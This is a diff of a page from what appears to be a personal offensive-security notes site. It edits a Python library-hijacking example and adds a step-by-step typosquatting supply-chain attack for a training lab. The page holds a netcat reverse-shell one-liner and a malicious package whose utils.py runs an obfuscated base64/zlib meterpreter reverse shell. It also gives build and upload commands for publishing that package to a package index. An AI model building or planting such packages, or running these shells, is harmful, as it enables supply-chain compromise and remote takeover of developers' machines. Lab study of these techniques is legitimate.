@@ -7,8 +7,8 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
-    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
-        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <link rel="stylesheet" href="/H4ckV4ult/styles/miscStyles.css">
+    <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet"/>
     <script src="/H4ckV4ult/styles/prism/prism.js"></script>
     <title>Minimalist Webpage</title>
 
@@ -45,12 +45,12 @@ os.system('id')</code></pre>
 
                 <h3>Library hijacking</h3>
                 <ul>
-                    <p>Have in mind the same example, you found a code where there some python libraries</p>
-                    <p>Since we saw that the code is importing a library called <b>psutil</b> we will create a file with name <b>psutil.py</b> <b>in the same place where we found the code which imports libraries</b></p>
+                    <p>Have in mind the same example, you found a code where there some python libraries. Example</p>
+                    <pre><code class="language-python">import wificontroller</code></pre>
+                    <p>Since we saw that the code is importing a library called <b>wificontroller</b> we will create a file with name <b>wificontroller.py</b> in the same directory where the python code is located</b></p>
                     <p>Inside we'll place the following: <b>Obviously the code must have the function which is located in the real psutil and also it's called in the vulnerable code we found</b></p>
                     <pre><code class="language-python">import os
-def virtual_memory():
-    os.system('id')</code></pre>
+os.system("id")</code></pre>
                     <p>That way when we execute the code it will go to found our malicious library instead of the legit one</p>
                     <p>Finally run the code as root</p>   
                     
@@ -166,11 +166,107 @@ print(r.text)</code></pre>
             <pre><code class="language-python">__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.91 6666 >/tmp/f")</code></pre>
         </ul>
 
-        </ul>
+        <h3>Dependency chain attack (Typosquatting)</h3>
+                <ul>
+                    <p>In case you found a package.json or requirements.txt file you could be able to perform a dependency chain attack. This is a type of supply chain attack that targets the dependencies of a software project. In this attack, an attacker injects malicious code into a dependency that is used by the target project.</p>
+                    <p>So instead of downloading a legitimate package, the victim downloads a package crafted by the attacker</p>
+                    <p>Based on what technology is being used the crafting of the package will vary. In this case well use python</p>
+                    <p>The package must have the following structure</p>
+                    <pre><code class="language-bash">└── hackshort-util
+    ├── setup.py
+    └── hackshort_util
+        └── __init__.py
+        └── utils.py</code></pre>
 
+                    <p>The setup.py should contain. Remember the package name must be the same as the target project is using</p>
+                    <pre><code class="language-bash">from setuptools import setup, find_packages
+from setuptools.command.install import install
+
+setup(
+      name='hackshort-util',
+      version='1.1.4',
+      packages=find_packages(),
+      classifiers=[],
+      install_requires=[],
+      tests_require=[],
+  )</code></pre>
+                        
+                    <p>The utils.py should contain.</p>
+                    <pre><code class="language-bash">import time
+import sys
+
+def standardFunction():
+          pass
+
+def __getattr__(name):
+          pass
+          return standardFunction
+
+def catch_exception(exc_type, exc_value, tb):
+      while True:
+          time.sleep(1000)
+
+sys.excepthook = catch_exception
+
+#msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('BASE64_METERPRETER_SHELL_HERE')[0])))</code></pre>
+                    <p><b>Remember the key is the version number</b> so in that case based on the requierements choose a number or other. Here are some examples</p>
+                    <pre><code class="language-cmd">==: This is the version matching clause. For example, if the requested package is some-package==1.0.0, only the 1.0.0 version would be downloaded. It's important to mention that wildcards can be used, so some-package==1.0.* would also match 1.0.0, 1.0.1, and so on.
+<=: This the version matching clause that would match any version equal or less than the specified version. For example, if some-package<=1.0.0 was requested, versions 1.0.0, 0.0.9, and 0.8.9 would match, but 1.0.1 and 7.0.2 would not.
+>=: This the version matching clause that would match any version equal or greater than the specified version. This is the opposite of the <= clause.
+~=: This is the compatible release clause, which will download any version that should be compatible with the requested version. This assumes that the developer versions the package according to the specification. For example, if some-package~=1.0.0 is requested, 1.0.1, 1.0.5, and 1.0.9 would all match, but 1.2.0 and 2.0.0 would not.  </code></pre>    
+                    <p>Once you have defined the setup.py let's build it</p>
+                    <pre><code class="language-bash">python3 ./setup.py sdist</code></pre>
+                    <p>This will generate a .tar.gz file</p>
+                    <p>Open your msfconsole and setup the according payload. <b>Recommend you to setup the LHOST: 0.0.0.0</b></p>
+                    <p>In case you would like to try the package first we need to install it locally. Here are all the steps</p>
+                    <div class="button" onclick="toggleDiv()">Show installation</div>
+                            <div id="foldedDiv" class="content">
+                               <p>First install the tar.gz file which we created when compilitaing. In case any command related with <b>PIP</b> or <b>python</b> fails complaining about the virtual environment just add <b>--break-system-packages</b></p> 
+                               <pre><code class="language-bash">pip install ./dist/hackshort_util-1.1.4.tar.gz</code></pre>
+                               <p>Then execute the package</p>
+                               <pre><code class="language-cmd">kali@kali:~$ python3                 
+Python 3.11.2 [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from hackshort_util import utils
+>>> utils.run()
+>>> 1/0</code></pre>
+                            </div>
+                    <p>Finally in order to upload our package let's create a .pypirc file and specify the package server. Just like this</p>
+                    <pre><code class="language-ini">[distutils]
+index-servers = 
+    offseclab 
+
+[offseclab]
+repository: http://pypi.offseclab.io/
+username: student
+password: password       
+</code></pre>
+                    <p>Now in order to upload it we need to run again the command to build it but in this case specifying the repository</p>
+                    <pre><code class="language-bash">twine upload --repository offseclab dist/hackshort_util-1.1.4.tar.gz --verbose</code></pre>
+
+                    <h4>Performing some debugging</h4>
+                    <ul>
+                        <p>In case you would like to perform some debugging or check if the package is being build correctely you would attempt ot install locally by using</p>
+                        <pre><code class="language-bash">pip install ./dist/hackshort_util-1.1.4.tar.gz</code></pre>
+                    </ul>
+                </ul>
+        </ul>
         </div>
     </div>
 
 
 </body>
+
+<script>
+    const botones = document.querySelectorAll(".button");
+
+    botones.forEach(boton => {
+    boton.addEventListener("click", () => {
+        const contenido = boton.nextElementSibling;
+        contenido.style.display =
+        contenido.style.display === "block" ? "none" : "block";
+    });
+    });
+    </script>
 </html>
